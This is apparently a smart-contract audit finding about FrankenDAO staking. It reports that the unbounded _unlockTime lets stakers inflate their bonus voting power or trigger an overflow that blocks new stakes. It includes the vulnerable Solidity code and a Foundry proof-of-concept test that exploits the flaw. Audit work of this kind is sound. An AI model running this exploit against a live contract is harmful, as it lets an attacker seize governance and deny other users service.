# [High-1] Lack of check on unlockTime allows any staker to inflate stakedTimeBonus to any amount

## Summary
[High-1] Lack of check on ``unlockTime`` allows any staker to inflate ``stakedTimeBonus`` to any amount

## Vulnerability Detail
FrankenDAO incentivizes stakers to lock their NFTs for a certain time, by giving them `stakedBonus` proportional to their unlock time.

This is regulated by 
`maxStakeBonusTime:` The maximum time one will earn bonus votes for staking for

`maxStakeBonusAmount:` The amount of bonus votes one will get if you stake for the max time

However, there is no check done if the `_unlockTime` passed in stake is under the limit of `maxStakeBonusTime`.

Allowing one to inflate the `stakedTImeBonus` and thereby their voting power.

```solidity
function stake(uint[] calldata _tokenIds, uint _unlockTime) 
----
function _stakeToken(uint _tokenId, uint _unlockTime) internal returns (uint) {
    if (_unlockTime > 0) {
      unlockTime[_tokenId] = _unlockTime; 
      uint fullStakedTimeBonus = ((_unlockTime - block.timestamp) * stakingSettings.maxStakeBonusAmount) / stakingSettings.maxStakeBonusTime; 
      stakedTimeBonus[_tokenId] = _tokenId < 10000 ? fullStakedTimeBonus : fullStakedTimeBonus / 2; 
    }

	..........
```
One can even exercise DOS and deny any new stakers by arithmetic overflow if they pass sufficiently large `_unlockTime`.

**Verification:**
```solidity
function testStaking__UnboundedUnlockTime() public {
        address owner = frankenpunks.ownerOf(PUNK_ID);

        vm.startPrank(owner);
        frankenpunks.approve(address(staking), PUNK_ID);

        uint[] memory ids = new uint[](1);
        ids[0] = PUNK_ID;

        (uint128 maxStakeBonusTime, ) = staking.stakingSettings();
        console.log(maxStakeBonusTime);
        staking.stake(ids, maxStakeBonusTime * 10000000000000000000);
        console.log(staking.getVotes(owner));
}

[PASS] testStaking__UnboundedUnlockTime() (gas: 328681)
Logs:

```

## Impact: High
This allows staker to inflate their voting power, in turn exposing the whole governance. An attacker can also exercise DOS attack by passing unlockTime so high that it would deny any new stake by overflow.

## Likelihood: High 
There is no need for any special circumstances for this to occur. Anyone with unstaked ``_frankenpunks`` or ``_frankenmonsters`` can do it.

## Recommendation
Consider adding check in the ``stake()`` that ``unlocktime â‰¤ maxStakeBonusTime``.
